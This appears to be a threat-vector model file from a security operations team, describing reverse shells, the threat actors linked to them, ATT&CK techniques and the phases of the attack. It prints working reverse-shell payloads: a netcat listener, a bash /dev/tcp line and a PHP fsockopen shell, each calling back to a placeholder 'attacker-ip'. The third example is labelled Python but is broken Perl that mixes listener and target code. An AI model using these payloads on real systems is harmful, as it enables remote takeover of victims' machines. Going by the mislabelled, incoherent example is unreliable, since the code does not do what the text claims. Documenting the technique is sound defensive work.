name: Reverse shell or remote session from compromised host
criticality: High
#references:
  #public:
    #1: 
  #internal:
    #a: 

metadata:
  uuid: 157710ff-962d-4fa3-a516-ac5883f2d5ef
  schema: tvm::2.1
  version: 3
  created: 2023-09-27
  modified: 2025-02-07
  tlp: clear
  organisation:
    uuid: 56b0a0f0-b0bc-47d9-bb46-02f80ae2065a
    name: EC DIGIT CSOC

threat:
  actors:
    - name: misp::b2056ff0-00b9-482e-b11c-c771daa5f28a #APT29
    - name: misp::aa29ae56-e54b-47a2-ad16-d3ab0242d5d7 #APT32
    - name: att&ck::G0067 #[Enterprise] APT37, Group123, InkySquid, Reaper, Ricochet Chollima, ScarCruft, TEMP.Reaper
    - name: misp::50cd027f-df14-40b2-aa22-bf5de5061163 #APT37
    - name: misp::647894f6-1723-4cba-aba4-0ef0966d5302 #FIN6
    - name: misp::00220228-a5a4-4032-a30d-826bb55aa3fb #FIN7
    - name: misp::bfb0bc20-5bdf-47ff-b07f-dbd9a3cb9772 #Fox Kitten
    - name: misp::3501fbf2-098f-47e7-be6a-6b0ff5742ce8 #APT15
    - name: misp::42be2a84-5a5c-4c6d-9864-3f09d75bb0ba #OilRig
    - name: misp::943f490e-ac7f-40fe-b6f3-33e2623649d2 #Whitefly
      #sighting: |
        #Type Here
      #references:
        #-
  killchain: Command & Control
  att&ck:
    - T1071.001 #Application Layer Protocol: Web Protocols
    - T1571 #Non-Standard Port
    - T1572 #Protocol Tunneling
    - T1059 #Command and Scripting Interpreter
  #chaining:
    #- relation: 
      #vector: 
      #description: |
        #Type Here
  #cve:
    #-
  #misp:
    #-
  domains:
    - Public Cloud
    - Private Cloud
    - Enterprise
    - Networking
  terrain: |
    Adversaries need way to initiate the reverse-shell 
    connection on the victim host either through vulnerability 
    exploitation, social engineering, or by other means.
  targets:
    - Personal Information
    - Workstations
    - Virtual Machines Host
    - Web Application Servers
    - Laptop
  platforms:
    - Windows
    - Linux
    - Azure
    - AWS
  severity: Significant incident 
  leverage:
    - Repudiation
    - Infrastructure Compromise
    - Information Disclosure
    - Elevation of privilege
    - Dwelling
    - Modify configuration
  impact:
    - Impairement
    - Data Breach
    - Reputational Damages
  viability: Likely
  description: |
    ### Threat vector
    A reverse shell is a technique that refers to a situation
    where adversaries, who have successfully compromised a system,
    establish a connection to their own system or server.
    This connection allows the adversaries to gain remote access 
    and control over the compromised system, enabling them to 
    execute commands and perform malicious actions.  

    ### Command&Control phases
    Below are the phases of how a reverse shell works:  

    - System compromise: the adversaries must succeed in compromising
      the security of the system. This may involve exploiting vulnerabilities
      in the software, misconfiguration, tricking the user into running a 
      malicious program, or via other ways.  

    - Establishing a reverse connection: Once the system has been compromised,
      the adversaries set up a reverse connection from the compromised system
      to their own. This is often done using a malicious application or script
      that runs on the compromised system and communicates with a server controlled 
      by adversaries.  

    - Remote control: With the reverse connection established, adversaries can
      have full or partial access and control over the compromised system. This 
      allows them to execute commands, manipulate files, steal information, install
      additional malware, modify configurations and perform other actions according 
      to their goals.  

    ### Code examples of reverse shells:

    #### Example 1 - Bash
          
      Start a listener on the attackers machine
      `nc -nlvp 4444`

      On the target machine, use Bash to establish a connection back to the listener
      `bash -i >& /dev/tcp/attacker-ip/4444 0>&1`

      This code assumes that the attacker has started a listener on their machine using
      the nc (netcat) utility, which is listening on a specified port (in this case, 4444). 
      The second line of code, which is executed on the target machine, uses Bash to open
      a connection back to the listener and establish a command shell. 

    #### Example 2 - PHP

      The attacker establishes a command shell on a remote machine by exploiting a
      vulnerability in the target system and using PHP, a server-side scripting language,
      to execute commands on the target machine:

    ```
      <?php
      // Start a listener on the attacker's machine
      $sock=fsockopen("attacker-ip", 4444);
      exec("/bin/sh -i <&3 >&3 2>&3");
      ?>
    ```

    The PHP code uses the fsockopen() function to open a connection to the listener and
    the exec() function to execute the /bin/sh shell and redirect its input, output, and
    error streams to the connection with the listener.

    #### Example 3 - Python

    This code example can be used to establish a command shell on a remote machine.

    Start a listener on the attackers machine
    ```
      use IO::Socket;
      $|=1;
      $socket = new IO::Socket::INET (
          LocalHost => '0.0.0.0',
          LocalPort => '4444',
          Proto => 'tcp',
          Listen => 1,
          Reuse => 1
      );

      Wait for a connection from the target machine
      $new_socket = $socket->accept();

      Open a command shell on the target machine
      system("/bin/sh -i <&3 >&3 2>&3");

      Close the connection
      $new_socket->close();
    ```
